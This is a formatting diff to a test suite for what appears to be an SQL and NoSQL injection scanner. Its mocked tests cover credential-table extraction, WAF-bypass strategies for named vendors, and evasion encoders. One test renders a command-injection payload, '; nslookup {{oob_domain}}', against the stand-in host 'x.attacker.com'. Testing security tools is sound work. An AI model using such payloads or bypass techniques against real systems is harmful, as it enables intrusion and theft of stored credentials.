@@ -58,7 +58,6 @@ class TestUnionInjection:
         assert result["vulnerable"] is False
 
 
-
 class TestUnionBlind:
     """Column count proven but no reflection -> union_blind + template."""
 
@@ -103,6 +102,7 @@ class TestContextProbe:
             callback=callback,
         )
         import requests
+
         sess = requests.Session()
         ctx = _probe_context("http://test.com/num", "id", sess, 5, None, None)
         assert ctx == "numeric"
@@ -125,6 +125,7 @@ class TestContextProbe:
             callback=callback,
         )
         import requests
+
         sess = requests.Session()
         ctx = _probe_context("http://test.com/str", "id", sess, 5, None, None)
         assert ctx == "string"
@@ -186,11 +187,11 @@ class TestBooleanRobust:
         assert result["type"] == "boolean"
 
 
-
 class TestDbmsAware:
     @responses.activate
     def test_error_retry_with_mssql_specific_payload(self):
         """Error detector retries with MSSQL-specific payloads after a hint."""
+
         def callback(request):
             v = _param_from(request)
             # Only the MSSQL CONVERT payload triggers the error
@@ -231,11 +232,11 @@ class TestDbmsAware:
             callback=callback,
         )
         import requests
+
         sess = requests.Session()
         result = wz_check("http://test.com/dbtables", "id", sess, 5)
         values = " ".join(str(d) for d in result["data"])
         assert "users" in values
-
 
 
 class TestTableDataExtraction:
@@ -268,12 +269,12 @@ class TestTableDataExtraction:
             callback=callback,
         )
         import requests
+
         sess = requests.Session()
         result = wz_check("http://test.com/dump", "id", sess, 5)
         values = " ".join(str(d) for d in result["data"])
         assert "username" in values or "password" in values
         assert "p4ss" in values or "admin" in values
-
 
 
 class TestNoSqlWhereBlind:
@@ -322,13 +323,13 @@ class TestNoSqlWhereBlind:
             callback=on_post,
         )
         import requests
+
         sess = requests.Session()
         result = nosql_check("http://test.com/nosql", "id", sess, 5)
         assert result["vulnerable"] is True
         extracted = result.get("where_extracted") or []
         values = " ".join(str(d) for d in extracted)
         assert "admin" in values, "expected $where blind extraction of field value"
-
 
 
 class TestNoSqlRedos:
@@ -352,6 +353,7 @@ class TestNoSqlRedos:
             callback=on_post,
         )
         import requests
+
         sess = requests.Session()
         result = _detect_redos("http://test.com/redos", "q", sess, 5, threshold=2.0)
         assert result["vulnerable"] is True
@@ -382,14 +384,32 @@ class TestPayloadEngineExpansion:
 
     def test_encoders_available(self):
         from tools.payload_engine import ENCODERS
-        for name in ("html_entity", "hex_quote", "wide_byte", "unicode_escape",
-                     "tab_sep", "url_partial", "concat_sql"):
+
+        for name in (
+            "html_entity",
+            "hex_quote",
+            "wide_byte",
+            "unicode_escape",
+            "tab_sep",
+            "url_partial",
+            "concat_sql",
+        ):
             assert name in ENCODERS
 
     def test_waf_strategies_expanded(self):
         from tools.payload_engine import WAF_STRATEGIES
-        for name in ("cloudflare", "aws_waf", "imperva", "akamai", "f5_bigip",
-                     "barracuda", "sucuri", "wordfence", "mod_security"):
+
+        for name in (
+            "cloudflare",
+            "aws_waf",
+            "imperva",
+            "akamai",
+            "f5_bigip",
+            "barracuda",
+            "sucuri",
+            "wordfence",
+            "mod_security",
+        ):
             assert name in WAF_STRATEGIES
 
     def test_cmdi_oob_payloads_have_placeholders(self):
@@ -409,6 +429,7 @@ class TestPayloadEngineExpansion:
 
     def test_render_oob_payload(self):
         from tools.payload_engine import render_oob_payload
+
         out = render_oob_payload("; nslookup {{oob_domain}}", "x.attacker.com", "http://x:1/")
         assert "x.attacker.com" in out
         assert "{{oob_domain}}" not in out
